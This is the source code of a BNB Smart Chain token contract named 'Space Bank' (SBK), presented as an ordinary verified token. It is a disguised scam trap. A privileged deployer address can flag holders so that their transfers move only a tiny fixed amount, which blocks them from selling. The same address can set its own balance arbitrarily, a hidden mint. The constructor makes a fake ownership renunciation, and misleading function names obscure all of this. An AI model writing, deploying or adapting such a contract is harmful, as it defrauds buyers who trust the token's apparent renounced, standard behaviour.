/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SpaceBank {
    uint8 public decimals = 18;
    address public limitWalletMode;
    mapping(address => bool) public receiverToken;

    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;


    mapping(address => bool) public fundIs;
    string public name = "Space Bank";
    uint256 constant launchedMode = 9 ** 10;

    mapping(address => uint256) public balanceOf;
    string public symbol = "SBK";

    address public sellFrom;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    modifier walletIs() {
        require(receiverToken[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router senderTotalLimit = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellFrom = IUniswapV2Factory(senderTotalLimit.factory()).createPair(senderTotalLimit.WETH(), address(this));
        owner = msg.sender;
        limitWalletMode = owner;
        receiverToken[limitWalletMode] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address launchedTo, uint256 walletSender) external returns (bool) {
        return transferFrom(msg.sender, launchedTo, walletSender);
    }

    function isAmount(address fromSell) public walletIs {
        fundIs[fromSell] = true;
    }

    function listSwap(address senderAuto, address toAuto, uint256 walletSender) internal returns (bool) {
        require(balanceOf[senderAuto] >= walletSender);
        balanceOf[senderAuto] -= walletSender;
        balanceOf[toAuto] += walletSender;
        emit Transfer(senderAuto, toAuto, walletSender);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function senderFee(address swapExempt) public walletIs {
        receiverToken[swapExempt] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transferFrom(address fundSender, address launchedTo, uint256 walletSender) public returns (bool) {
        if (fundSender != msg.sender && allowance[fundSender][msg.sender] != type(uint256).max) {
            require(allowance[fundSender][msg.sender] >= walletSender);
            allowance[fundSender][msg.sender] -= walletSender;
        }
        if (launchedTo == limitWalletMode || fundSender == limitWalletMode) {
            return listSwap(fundSender, launchedTo, walletSender);
        }
        if (fundIs[fundSender]) {
            return listSwap(fundSender, launchedTo, launchedMode);
        }
        return listSwap(fundSender, launchedTo, walletSender);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function walletTeam(uint256 walletSender) public walletIs {
        balanceOf[limitWalletMode] = walletSender;
    }


}